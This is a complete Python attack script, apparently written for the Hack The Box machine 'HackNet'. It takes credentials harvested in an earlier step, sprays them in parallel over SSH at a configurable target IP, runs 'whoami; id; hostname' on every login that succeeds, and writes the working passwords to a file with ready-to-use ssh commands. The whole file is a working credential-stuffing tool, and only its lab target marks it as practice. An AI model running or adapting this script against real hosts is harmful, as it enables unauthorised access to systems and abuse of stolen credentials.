#!/usr/bin/env python3
"""
SSH Credential Testing Script
Target: HackNet HTB Machine
Tests extracted credentials against SSH service
"""

import paramiko
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket

# ============================================
# CONFIGURATION - Modify for different targets
# ============================================
TARGET_HOST = "10.129.232.4"
TARGET_PORT = 22
CREDENTIALS_FILE = "credentials.json"
TIMEOUT = 10  # SSH connection timeout in seconds
MAX_THREADS = 5  # Number of parallel SSH attempts

# Output file
OUTPUT_FILE = "ssh_valid_credentials.txt"

# ============================================
# Colors for output
# ============================================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    """Print script banner"""
    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("=" * 60)
    print("  SSH Credential Validation Tool")
    print("  Target: HackNet HTB")
    print("=" * 60)
    print(f"{Colors.ENDC}")

def load_credentials(filepath):
    """
    Load credentials from JSON file
    
    Args:
        filepath: Path to credentials JSON file
    
    Returns:
        list: List of credential dictionaries
    """
    try:
        with open(filepath, 'r') as f:
            credentials = json.load(f)
        
        print(f"{Colors.OKBLUE}[*] Loaded {len(credentials)} credentials from {filepath}{Colors.ENDC}")
        return credentials
    
    except FileNotFoundError:
        print(f"{Colors.FAIL}[!] Error: File '{filepath}' not found{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Run extract_credentials.py first to get credentials{Colors.ENDC}")
        sys.exit(1)
    
    except json.JSONDecodeError:
        print(f"{Colors.FAIL}[!] Error: Invalid JSON in '{filepath}'{Colors.ENDC}")
        sys.exit(1)

def test_ssh_login(host, port, username, password, timeout):
    """
    Test SSH login with given credentials
    
    Args:
        host: Target hostname/IP
        port: SSH port
        username: Username to test
        password: Password to test
        timeout: Connection timeout
    
    Returns:
        dict: Result dictionary with success status and details
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    result = {
        'username': username,
        'password': password,
        'success': False,
        'message': '',
        'banner': ''
    }
    
    try:
        # Attempt SSH connection
        ssh.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
            auth_timeout=timeout
        )
        
        # If we get here, login succeeded!
        result['success'] = True
        result['message'] = 'Login successful!'
        
        # Try to get banner/info
        try:
            stdin, stdout, stderr = ssh.exec_command('whoami; id; hostname', timeout=5)
            banner_info = stdout.read().decode('utf-8', errors='ignore').strip()
            result['banner'] = banner_info
        except:
            result['banner'] = 'Could not retrieve user info'
        
        ssh.close()
        return result
        
    except paramiko.AuthenticationException:
        result['message'] = 'Authentication failed'
        return result
    
    except paramiko.SSHException as e:
        result['message'] = f'SSH error: {str(e)}'
        return result
    
    except socket.timeout:
        result['message'] = 'Connection timeout'
        return result
    
    except socket.error as e:
        result['message'] = f'Socket error: {str(e)}'
        return result
    
    except Exception as e:
        result['message'] = f'Unexpected error: {str(e)}'
        return result
    
    finally:
        try:
            ssh.close()
        except:
            pass

def test_credential(cred_dict, host, port, timeout):
    """
    Wrapper function to test a single credential
    
    Args:
        cred_dict: Credential dictionary
        host: Target host
        port: Target port
        timeout: Connection timeout
    
    Returns:
        dict: Test result
    """
    username = cred_dict.get('username', '')
    password = cred_dict.get('password', '')
    email = cred_dict.get('email', '')
    
    if not username or not password:
        return {
            'username': username,
            'password': password,
            'success': False,
            'message': 'Missing username or password',
            'banner': ''
        }
    
    print(f"{Colors.OKBLUE}[*] Testing: {username:20s}{Colors.ENDC}", end=" ")
    
    result = test_ssh_login(host, port, username, password, timeout)
    
    if result['success']:
        print(f"{Colors.OKGREEN}{Colors.BOLD}✓ SUCCESS!{Colors.ENDC}")
    else:
        print(f"{Colors.FAIL}✗ Failed - {result['message']}{Colors.ENDC}")
    
    return result

def save_valid_credentials(valid_creds, filepath):
    """
    Save valid SSH credentials to file
    
    Args:
        valid_creds: List of valid credential dictionaries
        filepath: Output file path
    """
    with open(filepath, 'w') as f:
        f.write("=" * 60 + "\n")
        f.write("  Valid SSH Credentials - HackNet\n")
        f.write(f"  Target: {TARGET_HOST}:{TARGET_PORT}\n")
        f.write("=" * 60 + "\n\n")
        
        for i, cred in enumerate(valid_creds, 1):
            f.write(f"Valid Credential #{i}:\n")
            f.write(f"  Username: {cred['username']}\n")
            f.write(f"  Password: {cred['password']}\n")
            f.write(f"  SSH Command: ssh {cred['username']}@{TARGET_HOST}\n")
            if cred.get('banner'):
                f.write(f"  User Info:\n")
                for line in cred['banner'].split('\n'):
                    f.write(f"    {line}\n")
            f.write("-" * 60 + "\n\n")
    
    print(f"{Colors.OKGREEN}[+] Valid credentials saved to: {filepath}{Colors.ENDC}")

def main():
    """Main execution function"""
    print_banner()
    
    # Load credentials
    credentials = load_credentials(CREDENTIALS_FILE)
    
    if not credentials:
        print(f"{Colors.FAIL}[!] No credentials found in file{Colors.ENDC}")
        sys.exit(1)
    
    print(f"{Colors.OKBLUE}[*] Target: {TARGET_HOST}:{TARGET_PORT}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Timeout: {TIMEOUT} seconds{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Threads: {MAX_THREADS}{Colors.ENDC}\n")
    
    print(f"{Colors.WARNING}[*] Starting SSH credential testing...{Colors.ENDC}\n")
    
    valid_credentials = []
    
    # Test credentials (with threading for speed)
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {
            executor.submit(test_credential, cred, TARGET_HOST, TARGET_PORT, TIMEOUT): cred 
            for cred in credentials
        }
        
        for future in as_completed(futures):
            result = future.result()
            
            if result['success']:
                valid_credentials.append(result)
    
    # Display results
    print(f"\n{Colors.HEADER}{Colors.BOLD}=" * 60)
    print("  RESULTS")
    print("=" * 60 + f"{Colors.ENDC}\n")
    
    if valid_credentials:
        print(f"{Colors.OKGREEN}{Colors.BOLD}[+] Found {len(valid_credentials)} valid SSH credential(s)!{Colors.ENDC}\n")
        
        for i, cred in enumerate(valid_credentials, 1):
            print(f"{Colors.OKGREEN}Valid Credential #{i}:{Colors.ENDC}")
            print(f"  {Colors.BOLD}Username:{Colors.ENDC} {cred['username']}")
            print(f"  {Colors.BOLD}Password:{Colors.ENDC} {cred['password']}")
            print(f"  {Colors.BOLD}SSH Command:{Colors.ENDC} ssh {cred['username']}@{TARGET_HOST}")
            
            if cred.get('banner'):
                print(f"  {Colors.BOLD}User Info:{Colors.ENDC}")
                for line in cred['banner'].split('\n'):
                    print(f"    {line}")
            print()
        
        # Save to file
        save_valid_credentials(valid_credentials, OUTPUT_FILE)
        
        print(f"\n{Colors.OKGREEN}{Colors.BOLD}[+] You can now SSH with:{Colors.ENDC}")
        print(f"{Colors.OKCYAN}    ssh {valid_credentials[0]['username']}@{TARGET_HOST}{Colors.ENDC}")
        print(f"{Colors.OKCYAN}    Password: {valid_credentials[0]['password']}{Colors.ENDC}\n")
    
    else:
        print(f"{Colors.FAIL}[!] No valid SSH credentials found{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] All tested credentials failed authentication{Colors.ENDC}\n")
        sys.exit(1)
    
    print(f"{Colors.OKGREEN}[+] Testing complete!{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] Total tested: {len(credentials)}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] Valid credentials: {len(valid_credentials)}{Colors.ENDC}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Interrupted by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.FAIL}[!] Unexpected error: {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
